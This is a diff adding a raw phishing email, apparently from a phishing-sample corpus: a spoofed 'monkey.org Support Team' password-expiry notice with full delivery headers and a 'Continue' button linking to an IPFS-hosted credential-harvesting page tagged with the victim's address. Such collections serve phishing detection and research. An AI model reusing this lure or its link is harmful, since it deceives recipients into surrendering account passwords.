@@ -1,0 +1,102 @@
+From jose@monkey.org Wed Oct 18 00:22:32 2023 +0000
+Return-Path: jusupov@gf.kg
+Delivered-To: jose@monkey.org
+X-FDA: 81356680944.34.891C12F
+Received: from mail.valmontgroup-bd.com (mail.valmontgroup-bd.com [202.4.96.131])
+	by imf08.b.hostedemail.com (Postfix) with ESMTP id CDBA2160005
+	for <jose@monkey.org>; Wed, 18 Oct 2023 00:22:30 +0000 (UTC)
+Authentication-Results: imf08.b.hostedemail.com;
+	dkim=none ("invalid DKIM record") header.d=monkey.org header.s=mail header.b="C7DUTB/i";
+	spf=softfail (imf08.b.hostedemail.com: 202.4.96.131 is neither permitted nor denied by domain of jusupov@gf.kg) smtp.mailfrom=jusupov@gf.kg;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1697588551;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=Rfs8IUwxOOhmT3Cp5L2jyw7gmz+Qucc/5Ya0AUi+5As=;
+	b=toLIOxAedJtuK+tjdtYDHHCWOXG2HYHv9146DMdD8NhEomb10+0DOjwNxWODLqCVu7Awav
+	MjPB1wiwJjJb+6hq0VpiS1yORzBwNdLPxI4E3GZLAEMqKFVx/d1J3Op+jjABcoGM/60Scj
+	5ZHM6R8F3rfc5CNugotRN36iSG7kIdc=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1697588551; a=rsa-sha256;
+	cv=none;
+	b=kszEBvbIy+3NSKXVt13tnGewIHHr/n76BYJQPURS4e35i3EoHcW0cqp+Mp092hNj0D75Ve
+	Lxv+FioX5MInbTFwSKOaNO+IKCiDwY/Nx9R6b8HiRCXpEwF5oyjGJPIulFkmqw4jrfLU2v
+	otRHWisA7HcL7Gk0QwoZC3KUSEKW1tc=
+ARC-Authentication-Results: i=1;
+	imf08.b.hostedemail.com;
+	dkim=none ("invalid DKIM record") header.d=monkey.org header.s=mail header.b="C7DUTB/i";
+	spf=softfail (imf08.b.hostedemail.com: 202.4.96.131 is neither permitted nor denied by domain of jusupov@gf.kg) smtp.mailfrom=jusupov@gf.kg;
+	dmarc=none
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=monkey.org;
+	 s=mail; h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
+	Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:
+	Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:
+	In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:
+	List-Post:List-Owner:List-Archive;
+	bh=Rfs8IUwxOOhmT3Cp5L2jyw7gmz+Qucc/5Ya0AUi+5As=; b=C7DUTB/iBDN040aEi4XDKAyhg6
+	weMSV2/iIqdyqMmEZ9McK9ZmQ9Fz7ZIAh/VShTbeoi+R3Rbc261960PR85UVnDumz6kLgBuhA2jQj
+	3m+KL+2cgzoncUM14YRjDCItPaThlO6pA2RQ72X7kjmb0YD01GjgDFxWsLEhi5arg4vPi5D9c0Yn4
+	qYATfxBFLtdzuN598thq4p5kQ6f8H0vIVyw0VfJ3ishlCcI/V3JxWeyVC20PlpP6CyEUkytfXakqk
+	KOUqrtTFhs+H6/jiLeyiRr3+2mN2S5kr7NqSCxWnJfwgQutqbK5TIcx+Nikpdlw3aujAWreh3vaJv
+	nsafB/ZQ==;
+Received: from [45.138.16.85] (helo=45.138.16.85.powered.by.rdp.sh)
+	by mail.valmontgroup-bd.com with esmtpsa (TLS1.2:ECDHE_RSA_AES_256_GCM_SHA384:256)
+	(Exim 4.90_1)
+	(envelope-from <jusupov@gf.kg>)
+	id 1qsuKR-0005cE-58
+	for jose@monkey.org; Wed, 18 Oct 2023 06:22:27 +0600
+From: monkey.org <jose@monkey.org>
+To: jose@monkey.org
+Subject: jose@monkey.org Password expires today
+Date: 18 Oct 2023 02:22:26 +0200
+Message-ID: <20231018022225.2388FEE332A6AD05@monkey.org>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam12
+X-Rspam-User: 
+X-Spam-Status: No, score=4.98
+X-Stat-Signature: 8zggxdo1qbusasphihkc41mddsbpkfgk
+X-Rspamd-Queue-Id: CDBA2160005
+X-HE-Tag: 1697588550-189882
+X-HE-Meta: U2FsdGVkX18trXKYcMN5TvvYUteqlXIUsLk4000GlnqLLiJSpvnY520S+wKwd1JOmm6OPoTsyc0xQr4XavOXs6lx6boaxtvw0ngJE23A2QEn89PVptOXEu+yqSBmIKEJ2U0kUf6pUGCNLkvHLD5RSfeB68JcH5bAM2aS8jHMvz19Osj+pvBySoOgktxNjI+nqbFHyv0QMtFVbslaNPyoOd82lekRR/LOgM1ox9LAth+1zb3TnjD+7XbtFC6tYTXUN9fpc599vgiWFk0r1AdCeewtDqc688jLBZRjx3nNsIHxDlrIrVzKQED6GxBrG76zIQCQmDNoa1I4xl+Ag2UXHgv0shcoVA2HQcD5Fi/929CH3qOhpxCYQZaLMg5jPbPgEtH1gtWcQ65LJj5QAK3etDs1gSWAFp+gUYIRJ3KMndRGdyiaA9bit7H00PhCPjExO6kZRRpDVlw=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 314
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.5em;">
+<p>
+
+ID: jose@monkey.org<br><br>
+
+Your jose@monkey.org password expires today  10/18/2023 2:22:25 a.m.  <br><=
+br>
+
+Use the button below to continue with same password<br><br>
+
+<p> <a style=3D"background: 0% 50% rgb(11, 102, 35); padding: 15px; width: =
+10%; text-align: center; color: white; font-size: 15px; text-decoration: no=
+ne; display: block; -moz-background-clip: -moz-initial; -moz-background-ori=
+gin: -moz-initial; -moz-background-inline-policy: -moz-initial;" href=3D"ht=
+tps://cloudflare-ipfs.com/ipfs/QmSEk4YKG4SZqiy6Jnv3ufHHhXcdDWKYy2Bqh5Z9fSir=
+TB/index2cha0210.html#jose@monkey.org" target=3D"_blank"> Continue </a></p>=
+
+
+<p>Note: Your mails may not be delivered until you verify your account.</p>=
+
+<p>Sincerely,</p>
+<p>monkey.org Support Team.</p>
+<p></p>
+
+
+</body></html>
